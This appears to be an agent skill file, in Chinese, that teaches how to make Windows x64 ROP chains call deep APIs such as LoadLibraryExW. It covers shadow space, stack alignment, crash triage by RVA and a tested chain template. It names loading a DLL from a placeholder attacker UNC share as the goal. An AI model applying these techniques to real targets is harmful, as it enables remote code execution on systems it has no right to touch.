---
name: 'windows-rop-deep-call'
description: 'x64 ROP 链里调用**深调用**函数（LoadLibraryExW / CreateFileW / WinExec 类）的三件套：①`jmp rax` 后 `[rsp]`=返回地址、`[rsp+8..0x28)`=callee 的 **shadow space 必被覆写** ⇒ 返回地址槽必须放 `add rsp,X; ret` 跳过该区，否则函数成功返回后跳垃圾（症状 `rip=0` / `rax=base&~0xFFFFFFFF`）；②callee 入口要求 `rsp%16==8` ⇒ 链中 `jmp rax` 槽**下标必须为奇数**（崩在 `movaps`/`fxsave` 就是它）；③崩点定位法：崩在 `ntdll+X` 就按 RVA 查导出表取最近导出名（本例 `RtlDosApplyFileIsolationRedirection_Ustr+0x192` 的 `movaps [rsp+0x220],xmm6`）。含分层验证阶梯（叶子调用→深调用→loader）与"自旋≠控制流已被夺"的硬判据。（检索词：ROP deep call、ROP 深调用、shadow space、shadow-space、调用后跳垃圾、rip=0、rax=base&~0xFFFFFFFF、movaps 对齐、movaps alignment、fxsave、rsp%16、16 字节对齐、jmp rax、LoadLibraryExW ROP、LoadLibrary ROP、UNC DLL 加载、CreateFileW ROP、栈对齐、odd 下标、奇偶对齐、deep call、RtlDosApplyFileIsolationRedirection、崩点定位 RVA、ntdll 导出名反查、自旋判据、模块表判据、mods 验证、x64 ROP、windows ROP chain）'
whenToUse: '在 Windows 目标上已能控 RIP、要调 `LoadLibraryExW`/`CreateFileW`/`GetModuleHandleW` 这类**深调用**函数时；或链"看起来跑起来了"但函数返回后跳垃圾 / 崩在 ntdll 的 `movaps`、`fxsave` 时。'
metadata: { domain: ad-win, tier: T2 }
---

# x64 ROP：安全地调用"深调用"函数

> 一句话：**叶子函数能调通 ≠ 深调用能调通**。深调用会用到 SSE 对齐的栈帧和 shadow space，
> 这两点会把"能控 RIP"变成"一跳就崩"，而且症状看起来像随机损坏。

## 4. 分层验证阶梯（每层一个独立判据）

| 层 | 试什么 | 通过说明 | 硬判据 |
|---|---|---|---|
| L1 | 叶子调用（`GetLastError`） | 能经 IAT 间接调用并返回 | 进程存活 + 自旋 |
| L2 | 浅层 API（`CreateFileW`，可失败） | 参数传递/返回路径正确 | 存活 + 自旋（**失败也正常返回**） |
| L3 | loader（`LoadLibraryExW`） | 能落地第三方代码 | 🔴 **模块表里真的多出该 DLL**（外部枚举进程模块），不是"进程还活着" |

🔴 **"自旋 ≠ 控制流已被夺"**：若链根本没执行（例如载荷被目标拒绝、长度被截断），
"进程仍在跑 + 无输出"看起来和"链在自旋"**一模一样**。
必须用**外部、可区分**的观测：进程死活 / 模块表 / 目标侧内存写入 / 抓包 / 服务活性。
设计实验时先写下"哪种观测能区分这两种情况"，再动手。

## 1. 什么时候用（触发信号）

- 已经能控 RIP（自旋链验证过），但**一调 API 就崩**，而 `GetLastError()` 这类叶子函数正常。
- 崩溃地址忽左忽右：`rip=0`、`rax=base&~0xFFFFFFFF`、`ntdll+0x?????` 的 `movaps`/`fxsave`。
- 需求本身就是"从 ROP 落地代码"：`LoadLibraryExW("\\\\attacker\\share\\x.dll")`、`CreateFileW`、`WinExec` 类。

## 2. 三件套（缺一个就“成功返回后跳垃圾”）

### 2.1 返回地址槽必须是 `add rsp,X; ret`（shadow space 必被覆写）

`jmp rax` 进被调函数时，**ABI 语义和 `call` 完全一样**：

```
[rsp]            返回地址        ← 只有它安全
[rsp+8 .. 0x28)  shadow space    ← 🔴 callee 会把 rcx/rdx/r8/r9 溢出写进来（4 个 qword）
[rsp+0x28 ..]    第 5+ 个栈参数
```

⇒ 如果你把"自旋 gadget / 后续链"紧跟在 `jmp rax` 后面，**函数返回时那块已被覆写**，
于是跳到垃圾（典型 `rip=0`，或 `rax=base&~0xFFFFFFFF` 这种"半个地址"）。
**修法**：返回地址槽放 `add rsp,0x38; ret`（或 `0x78`），其后留 ≥4~7 个 qword 填充，
真正的后续链放在跳过区之后。

### 2.2 入口对齐：`jmp rax` 槽的下标必须是奇数

x64 ABI：callee 入口要求 `rsp % 16 == 8`（即调用点上 `rsp%16==0`，`call` 压栈后为 8）。
链是一串 8 字节 qword：若 `jmp rax` 在链中的**下标为偶数**，进 callee 时 `rsp%16==0` ⇒ 内部
`movaps [rsp+0x220], xmm6` 之类 SSE 对齐存储直接 **#GP → 0xC0000005**。

- 判据：崩点落在 ntdll 的 SSE 存取指令上，且**换一条"多/少 1 个 qword"的链崩法会变**。
- 修法：在 `jmp rax` 之前塞 3 个 qword（一个 `mov edx,[rsp]`-类 gadget + 2 填充）翻转奇偶；
  或用一个 bare `ret` gadget 翻转。**两条奇偶都试一遍，成本只有 1 分钟。**

### 2.3 参数寄存器的现实约束（先把坑摸清再设计链）

| 寄存器 | 常态可得性 | 备注 |
|---|---|---|
| `rcx` | 容易（`pop rax` + `mov rcx, rax`） | 64 位完整可控 ⇒ 字符串指针放它 |
| `rdx` | **经常只有 32 位**（`mov edx,[rsp]` 零扩展） | ⇒ 第 2 参要指针的 API（`fopen` 的 mode、`WriteFile` 的 buffer、`GetProcAddress` 的名字串）可能**直接没戏**，先搜 "`mov rdx,` 结尾 ret 的 gadget" 再决定路线 |
| `r8` / `r9` | 常只有 `mov r9,rbx; mov r8,0` 这一类 | 需要 `r8=0x3000`（VirtualAlloc 的 MEM_COMMIT\|RESERVE）时，看有没有 `mov r8,[rdx]` 且**不碰 r9** 的 gadget，再找"低位已知地址"喂常量 |
| 算术 | 常见缺口 | 找 `add rbx, rdi ; mov rax, rbx ; ...` 这类"两寄存器和 → rax"的 gadget 来算 `base+RVA` |

## 3. 崩点定位法：RVA → 导出名 → 指令

崩在 `ntdll+0x3ed12` 这种地址时**别猜**：

1. 从崩溃寄存器/栈读出 `ntdll` 基址，算 RVA；
2. 解析目标机上同版本 ntdll 的**导出表**，取"≤RVA 的最近导出"⇒ 得到函数名（本例
   `RtlDosApplyFileIsolationRedirection_Ustr+0x192`）；
3. 用 capstone 反汇编该 RVA 前后 ~0x60 字节，看到 `movaps [rsp+0x220], xmm6` ⇒ **对齐问题**。

这一步把"玄学随机崩"变成"5 分钟能修"；同理 `fxsave [rcx+0x100]` 在 `RtlCaptureContext` 里
也是同一类（`rcx` 由 `rsp+0x110` 算出 ⇒ 入口错 8 字节）。

## 5. 症状对照表（照表抓药）

| 症状 | 最可能原因 | 一分钟验证 |
|---|---|---|
| 函数返回后 `rip=0` / `rax=base&~0xFFFFFFFF` | shadow space 覆写了返回后的链 | 返回地址改成 `add rsp,X; ret` + 填充 |
| 崩在 ntdll `movaps`/`fxsave` | 入口 `rsp%16 != 8` | 链里 `jmp rax` 下标换奇偶再打一次 |
| `jmp rax` 后立刻崩在非法地址 | 载入的函数指针本身错了（IAT 槽/参数） | 直接读目标进程内存 dump IAT 槽验证 |
| 链被"跑通"但什么都没发生 | **根本没溢出**（输入被拒/被截断） | 看目标的**完整**回显（别只打印末尾几十字节） |
| 崩在栈顶附近、`MEM_FREE` 页 | 换了"假栈"（堆/小缓冲）但没给足空间 | 栈空间要 ≥ 数 KB，且**在线程 TEB 的栈范围内**最稳 |

## 6. 可抄的链模板（实测通过）

```
[pop rcx 值: 宽字符串指针(如 keybuf 里)] [mov rcx, rax]
[set rdx = 0] [set r8 = 0]                     # 0/0 最省事
[pop rdi = &IAT_FUNC] [mov rax,[rdi]]          # 间接取函数地址
[3 个 qword 填充 —— 同时充当奇偶翻转]            # 🔴 让 jmp rax 落在奇数下标
[jmp rax]                                      # 等价于 call
[add rsp,0x38; ret]                            # 🔴 返回地址槽：跳过 shadow space
[7 个 qword 填充]
[pop rax][jmp rax][jmp rax]                    # 自旋（证明返回成功）
```

## 7. 反模式

- ❌ 把自旋/后续链直接放在 `jmp rax` 后面（必被 shadow space 覆写）。
- ❌ 只看"进程还活着"就宣布调用成功（可能是函数直接失败返回，甚至没溢出）。
- ❌ 在"栈来源"上反复换（小缓冲 / 堆 / 假栈）却不先检查对齐 —— 对齐是 1 分钟的事。
- ❌ 移植/重写构造脚本后不复核（本次真实事故：移植时漏了填充，导致载荷被目标判非法，
  靶机上根本没溢出，却被误读成"链在自旋"）。
